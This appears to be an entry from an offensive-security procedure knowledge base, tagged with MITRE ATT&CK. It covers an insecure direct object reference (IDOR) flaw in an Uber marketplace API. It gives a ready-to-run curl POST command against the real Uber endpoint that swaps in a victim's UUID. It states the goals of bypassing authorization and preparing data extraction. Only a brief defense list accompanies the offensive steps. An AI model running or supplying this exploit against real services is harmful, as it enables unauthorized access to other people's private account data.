---
id: p2b3c4d5-e6f7-8901-bcde-f2345678901
tags:
  - idor
  - exploitation
  - api
type: procedure
tools:
  - '[[tools/curl]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/curl-post-uber-idor]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2024-01-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:25:22.988Z'
skill_level: intermediate
impact_level: medium
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Manipulate-userUuid-for-IDOR

## Summary

This procedure exploits the IDOR vulnerability by substituting the victim's UUID in the 'userUuid' parameter of Uber's API request, bypassing authorization to access unauthorized user data.

## Description

Once the endpoint is identified, attackers craft a modified POST request to https://bonjour.uber.com/marketplace/_rpc?rpc=getConsentScreenDetails, replacing their own 'userUuid' with the target's. The server's failure to validate ownership allows the request to proceed, returning the victim's consent screen details. This requires the victim's UUID (from recon) and API access; outcomes include successful unauthorized access without errors.

## Requirements

1. Victim's UUID (e.g., from prior enumeration or social engineering)
2. curl or similar HTTP client
3. Valid session cookies if the endpoint requires authentication (test first)

## Defense

Defensive measures and detection strategies:

- Enforce server-side checks to ensure the requesting user owns the referenced UUID
- Implement indirect object references (e.g., hashed IDs) to obscure direct manipulation
- Monitor for UUID mismatches in access logs and alert on suspicious patterns

## Objectives

1. Bypass authorization via parameter tampering
2. Confirm access to victim-specific data
3. Set up for data extraction in the next phase

## Instructions

### Step 1: Prepare the Malicious Request

**Context**: Construct the POST payload with the victim's UUID to test IDOR.

**Command** ([[commands/curl-post-uber-idor]]):
```bash
curl -X POST 'https://bonjour.uber.com/marketplace/_rpc?rpc=getConsentScreenDetails' \
  -H 'Content-Type: application/json' \
  -d '{"userUuid": "victim-uuid-here"}'
```

> Replace "victim-uuid-here" with the actual victim's UUID. Expected output: JSON response with victim's data instead of an error, indicating successful IDOR exploitation.

### Step 2: Validate Response

**Context**: Check for absence of authorization errors and presence of user-specific content.

No command; parse the JSON response manually or with jq.

> Expected output: 200 status with consent details tied to the victim.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application

### Sub-Techniques


## Commands Used

- [[commands/curl-post-uber-idor]]

## Tools Used

- [[tools/curl]]

## Tags

- [[idor]]
- [[exploitation]]
- [[api]]
